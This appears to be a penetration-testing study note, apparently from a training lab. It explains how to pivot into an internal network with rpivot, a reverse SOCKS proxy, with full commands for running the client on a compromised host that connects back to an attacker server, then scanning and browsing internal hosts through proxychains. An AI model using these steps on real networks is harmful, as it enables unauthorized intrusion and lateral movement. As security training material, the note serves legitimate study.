# Web Server Pivoting with Rpivot

## Overview

**Rpivot** is a Python-based reverse SOCKS proxy that allows a compromised internal host to create a tunnel back to an external attack host.

Unlike traditional pivoting tools that require inbound connectivity to the compromised system, **rpivot works in reverse**, making it useful when:

- inbound firewall rules block connections to the compromised host
- outbound connections are allowed
- we need SOCKS proxy functionality for tools like proxychains
- we want to reach internal services (e.g., web servers)

Rpivot is particularly useful when:

- SSH is not available
- Meterpreter is not available
- only outbound HTTP/HTTPS traffic is allowed
- the environment requires NTLM proxy authentication

---

# How Rpivot Works

Rpivot consists of two components:

| Component | Runs on | Purpose |
|----------|--------|---------|
| server.py | attack host | creates SOCKS proxy listener |
| client.py | compromised host | connects back to server |

The compromised host initiates the connection back to the attack host, establishing a reverse tunnel that allows the attacker to pivot into the internal network.

---

# Scenario

Internal network contains:

```
172.16.5.0/23
```

Target web server:

```
172.16.5.135:80
```

Constraints:

- attacker cannot directly access internal network
- compromised Ubuntu pivot host can reach internal web server
- pivot host can initiate outbound connections to attack host

Solution:

Use rpivot to create a reverse SOCKS proxy.

---

# Install Rpivot

Clone repository:

```bash
git clone https://github.com/klsecservices/rpivot.git
```

---

# Python Requirement

Rpivot requires Python 2.7.

Install Python 2.7:

```bash
sudo apt-get install python2.7
```

Alternative installation using pyenv:

```bash
curl https://pyenv.run | bash

echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc

source ~/.bashrc

pyenv install 2.7
pyenv shell 2.7
```

Verify version:

```bash
python2.7 --version
```

---

# Start Rpivot Server (Attack Host)

Run server component on attack host:

```bash
python2.7 server.py \
--proxy-port 9050 \
--server-port 9999 \
--server-ip 0.0.0.0
```

## Parameter Explanation

| Parameter | Description |
|----------|-------------|
| --proxy-port 9050 | local SOCKS proxy port |
| --server-port 9999 | port waiting for pivot client connection |
| --server-ip 0.0.0.0 | listen on all interfaces |

Result:

Attack host listens for pivot connection on port 9999 and exposes SOCKS proxy on port 9050.

---

# Transfer Rpivot to Pivot Host

Copy rpivot to compromised Ubuntu host:

```bash
scp -r rpivot ubuntu@<targetIP>:/home/ubuntu/
```

---

# Start Rpivot Client (Pivot Host)

Execute client component on compromised system:

```bash
python2.7 client.py \
--server-ip 10.10.14.18 \
--server-port 9999
```

## Expected Output

```text
Backconnecting to server 10.10.14.18 port 9999
New connection from host 10.129.202.64
```

Connection flow:

```
pivot host --> attack host:9999
```

SOCKS proxy becomes available locally on attack host.

---

# Configure Proxychains

Add SOCKS proxy entry:

```bash
sudo nano /etc/proxychains.conf
```

Add:

```bash
socks4 127.0.0.1 9050
```

---

# Access Internal Web Server

Browse internal service through proxy:

```bash
proxychains firefox-esr 172.16.5.135:80
```

or using curl:

```bash
proxychains curl http://172.16.5.135
```

Traffic flow:

```
browser --> proxychains
              ↓
        SOCKS proxy (9050)
              ↓
         rpivot server
              ↓
         rpivot client
              ↓
       internal web server
```

---

# Full Attack Flow Diagram

```
Attacker Host
127.0.0.1:9050
     │
     │ SOCKS proxy
     ▼
rpivot server.py
10.10.14.18:9999
     │
     │ reverse connection
     ▼
rpivot client.py
Ubuntu pivot host
10.129.x.x
     │
     │ internal access
     ▼
172.16.5.135:80
Internal web server
```

---

# Using Rpivot with Nmap

Example scan:

```bash
proxychains nmap -sT -Pn 172.16.5.135 -p80
```

---

# Using Rpivot with SMB

```bash
proxychains smbclient -L //172.16.5.135
```

---

# NTLM Proxy Authentication Scenario

Some corporate environments require outbound traffic to pass through an authenticated HTTP proxy.

Rpivot supports NTLM authentication.

Example:

```bash
python client.py \
--server-ip 10.10.14.18 \
--server-port 8080 \
--ntlm-proxy-ip 192.168.1.100 \
--ntlm-proxy-port 8081 \
--domain CORP \
--username bob \
--password Password123
```

## Additional Parameters

| Parameter | Description |
|----------|-------------|
| --ntlm-proxy-ip | corporate proxy server |
| --ntlm-proxy-port | proxy port |
| --domain | Windows domain |
| --username | domain username |
| --password | domain password |

Useful when:

- outbound traffic restricted
- NTLM proxy enforced
- corporate environment heavily filtered

---

# Advantages of Rpivot

## Works when SSH is unavailable

Does not require SSH service on pivot host.

## Reverse connection

Pivot host initiates connection outward.

## SOCKS proxy compatible

Works with proxychains.

## Supports NTLM authentication

Useful in enterprise environments.

## Lightweight

Python-based.

---

# Limitations

## Requires Python 2.7

Legacy dependency.

## Requires proxychains configuration

Unlike sshuttle.

## TCP only

No native UDP pivoting.

## Slower than direct routing

SOCKS proxy overhead.

---

# Comparison with Other Pivot Tools

| Tool | Protocol | Requires SSH | Requires proxychains |
|------|----------|-------------|---------------------|
| ssh -D | SOCKS | yes | yes |
| meterpreter socks | SOCKS | no | yes |
| sshuttle | iptables | yes | no |
| rpivot | SOCKS | no | yes |
| socat | TCP relay | no | depends |

---

# Quick Command Reference

## Clone repo

```bash
git clone https://github.com/klsecservices/rpivot.git
```

## Install Python2.7

```bash
sudo apt-get install python2.7
```

## Start server

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

## Transfer files

```bash
scp -r rpivot ubuntu@target:/home/ubuntu/
```

## Run client

```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

## Configure proxychains

```bash
socks4 127.0.0.1 9050
```

## Browse internal webserver

```bash
proxychains firefox-esr 172.16.5.135:80
```

---

# Mental Model

rpivot creates a reverse SOCKS tunnel.

Instead of:

attacker connecting inward

the compromised host connects outward.

Once connected, the attacker gains proxy access to the internal network.

---

# Key Takeaways

- rpivot provides reverse SOCKS tunnelling.
- useful when inbound connections blocked.
- supports NTLM proxy authentication.
- integrates with proxychains.
- enables access to internal web servers.
- useful in restricted enterprise environments.

---

# Tags

#pivoting  
#tunnelling  
#port-forwarding  
#rpivot  
#socks  
#proxychains  
#redteam  
#networking  
#linux  
#obsidian